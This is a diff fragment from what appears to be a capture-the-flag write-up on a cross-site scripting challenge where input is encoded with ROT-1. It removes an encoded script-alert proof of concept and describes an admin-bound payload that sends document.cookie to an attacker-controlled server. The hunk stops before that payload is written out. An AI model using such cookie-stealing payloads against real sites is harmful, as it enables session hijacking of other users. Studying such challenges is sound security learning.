@@ -29,16 +29,12 @@ We find the ciphertext being decrypted as ROT1 but what we actually need is the 
 
 ![4](../images/kff_7.png)
 
-```;rbqhos=`kdqs'!Gdkkn}Vnqkc~!(;.rbqhos=``` equals ```<script>alert("Hello World!")</script>```
-
 We finally discover the encryption is ROT-1 (ROT47(-48)). Let's try then to get some XSS working!
-
 
 
 ![5](../images/kff_4.png)
 
-
-
+... And we were right!!!
 
 Now that we finally have our PoC working, we need to send the payload to the admin in order to steal their session cookie. We can do this with the following payload, where `document.location=<our website>?cookie=:` is the listening server we control and `document.cookie` is the cookie we want to steal from the admin:  
 
